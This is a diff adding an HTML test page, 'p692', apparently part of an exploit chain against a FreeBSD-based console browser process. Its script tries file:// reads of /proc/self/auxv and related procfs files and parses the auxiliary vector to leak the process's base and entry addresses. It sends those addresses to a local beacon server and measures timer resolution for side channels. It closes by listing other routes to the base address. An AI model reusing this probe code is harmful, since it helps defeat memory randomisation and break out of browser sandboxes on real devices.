@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>p692: WebProcess base via /proc/self/auxv</title>
+</head>
+<body>
+<h2>p692: WebProcess base via /proc/self/auxv</h2>
+<p>Tests whether procfs auxiliary vector is accessible from WebProcess context.
+If AT_PHDR is readable, WebProcess_base = AT_PHDR - e_phoff (one measurement, no source).</p>
+<pre id="log"></pre>
+<script>
+// p692: Test /proc/self/auxv accessibility from WebProcess
+// Prior art: cobrajet302gt PR #240 review arm 2
+// If procfs is reachable, AT_PHDR gives the text base directly.
+//
+// FreeBSD auxv entry: { uint64 type, uint64 value }
+// AT_PHDR = 3: address of ELF program headers in memory
+// AT_ENTRY = 9: entry point
+// AT_BASE = 7: interpreter base (dyld equivalent)
+// AT_EXECPATH = 15: path to executable
+//
+// stat("/proc") returns -1 from the Lua loader on 14.10,
+// but WebProcess may have different jail rules.
+
+var log = document.getElementById('log');
+function L(s) { log.textContent += s + '\n'; }
+var B = 'http://127.0.0.1:8080/beacon?';
+
+L('=== p692: AUXV BASE PROBE ===');
+L('TIME: ' + new Date().toISOString());
+L('');
+
+// Test 1: Can we fetch /proc/self/auxv?
+L('--- TEST 1: /proc/self/auxv fetch ---');
+var paths = [
+    '/proc/self/auxv',
+    '/proc/curproc/auxv',
+    '/proc/self/status',
+    '/proc/curproc/status',
+    '/proc/self/map',
+    '/proc/curproc/map',
+    '/proc/self/exe',
+];
+
+var results = {};
+var pending = paths.length;
+
+function tryPath(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'file://' + path, true);
+    xhr.responseType = 'arraybuffer';
+    xhr.onload = function() {
+        L('FETCH ' + path + ': status=' + xhr.status + ' size=' + (xhr.response ? xhr.response.byteLength : 0));
+        results[path] = { status: xhr.status, size: xhr.response ? xhr.response.byteLength : 0 };
+        if (xhr.response && xhr.response.byteLength > 0) {
+            parseAuxv(path, xhr.response);
+        }
+        checkDone();
+    };
+    xhr.onerror = function() {
+        L('FETCH ' + path + ': ERROR (blocked or not found)');
+        results[path] = { status: -1, size: 0 };
+        checkDone();
+    };
+    try {
+        xhr.send();
+    } catch(e) {
+        L('FETCH ' + path + ': EXCEPTION ' + e.message);
+        results[path] = { status: -2, size: 0, error: e.message };
+        checkDone();
+    }
+}
+
+function parseAuxv(path, buffer) {
+    // FreeBSD auxv: pairs of uint64 (type, value)
+    // On 64-bit: each entry is 16 bytes
+    L('');
+    L('--- AUXV PARSE: ' + path + ' ---');
+    var view = new DataView(buffer);
+    var AT_NAMES = {
+        0: 'AT_NULL', 3: 'AT_PHDR', 4: 'AT_PHENT', 5: 'AT_PHNUM',
+        6: 'AT_PAGESZ', 7: 'AT_BASE', 9: 'AT_ENTRY', 15: 'AT_EXECPATH',
+        16: 'AT_CANARY', 17: 'AT_CANARYLEN', 18: 'AT_OSRELDATE',
+        19: 'AT_NCPUS', 20: 'AT_PAGESIZES', 23: 'AT_STACKPROT'
+    };
+
+    for (var off = 0; off + 16 <= buffer.byteLength; off += 16) {
+        // Read as two uint64 (little-endian)
+        var typeLo = view.getUint32(off, true);
+        var typeHi = view.getUint32(off + 4, true);
+        var valLo = view.getUint32(off + 8, true);
+        var valHi = view.getUint32(off + 12, true);
+
+        var typeName = AT_NAMES[typeLo] || ('AT_' + typeLo);
+        var valHex = '0x' + (valHi ? (valHi.toString(16) + valLo.toString(16).padStart(8, '0')) : valLo.toString(16));
+
+        L('  ' + typeName + ' = ' + valHex);
+
+        if (typeLo === 3) {
+            // AT_PHDR -- this is it
+            L('');
+            L('*** AT_PHDR FOUND: ' + valHex + ' ***');
+            L('WebProcess program headers at this address.');
+            L('base = AT_PHDR - e_phoff (e_phoff is typically 0x40 for 64-bit ELF)');
+            L('Assuming e_phoff=0x40: base = ' + valHex + ' - 0x40');
+            // Approximate base
+            var baseLo = valLo - 0x40;
+            var baseHi = valHi;
+            if (baseLo < 0) { baseLo += 0x100000000; baseHi--; }
+            var baseHex = '0x' + (baseHi ? (baseHi.toString(16) + baseLo.toString(16).padStart(8, '0')) : baseLo.toString(16));
+            L('Estimated base: ' + baseHex);
+
+            // Send beacon
+            try {
+                new Image().src = B + 'p692-PHDR=' + valHex + ',BASE=' + baseHex;
+            } catch(e) {}
+        }
+
+        if (typeLo === 9) {
+            L('*** AT_ENTRY: ' + valHex + ' (entry point) ***');
+            try { new Image().src = B + 'p692-ENTRY=' + valHex; } catch(e) {}
+        }
+
+        if (typeLo === 0) break; // AT_NULL terminates
+    }
+}
+
+function checkDone() {
+    pending--;
+    if (pending <= 0) {
+        L('');
+        L('--- TEST 2: Alternative approaches ---');
+        testAlternatives();
+    }
+}
+
+function testAlternatives() {
+    // Test sysctl-based approaches that might work from JS
+    // kern.proc.pathname (CTL_KERN=1, KERN_PROC=14, KERN_PROC_PATHNAME=12, pid=-1)
+    L('No sysctl from JS. Alternatives require Lua loader bridge.');
+    L('');
+
+    // Test if we can detect our own PID
+    L('--- TEST 3: Process identity ---');
+    L('navigator.userAgent: ' + navigator.userAgent);
+    L('location.href: ' + location.href);
+
+    // Test performance.now resolution (timing side channel quality)
+    var t0 = performance.now();
+    var sum = 0;
+    for (var i = 0; i < 10000; i++) sum += i;
+    var t1 = performance.now();
+    L('perf.now resolution test: 10K loop = ' + (t1-t0).toFixed(6) + 'ms');
+    L('');
+
+    // Summary
+    L('=== p692 SUMMARY ===');
+    var anySuccess = false;
+    for (var p in results) {
+        if (results[p].size > 0) anySuccess = true;
+    }
+    if (anySuccess) {
+        L('RESULT: procfs ACCESSIBLE -- WebProcess base derivable');
+    } else {
+        L('RESULT: procfs NOT accessible from WebProcess JS context');
+        L('');
+        L('Remaining routes to WebProcess base:');
+        L('  1. Lua loader: sysctl kern.proc.pathname + read /proc from loader PID');
+        L('  2. Lua loader: sys 593 dynlib_get_info on WebProcess modules (cross-process)');
+        L('  3. 13.60 kernel dump: extract WebProcess binary, compute static RVA');
+        L('  4. Crash backtrace: if CE-108262-9 ever shows frames (unlikely)');
+        L('  5. In-process: fontLoaded/deref code read after base guess');
+    }
+    L('');
+    L('=== p692 COMPLETE ===');
+
+    // Final beacon
+    try {
+        new Image().src = B + 'p692-done=' + (anySuccess ? 'ACCESSIBLE' : 'BLOCKED');
+    } catch(e) {}
+}
+
+// Start tests
+paths.forEach(tryPath);
+</script>
+</body>
+</html>
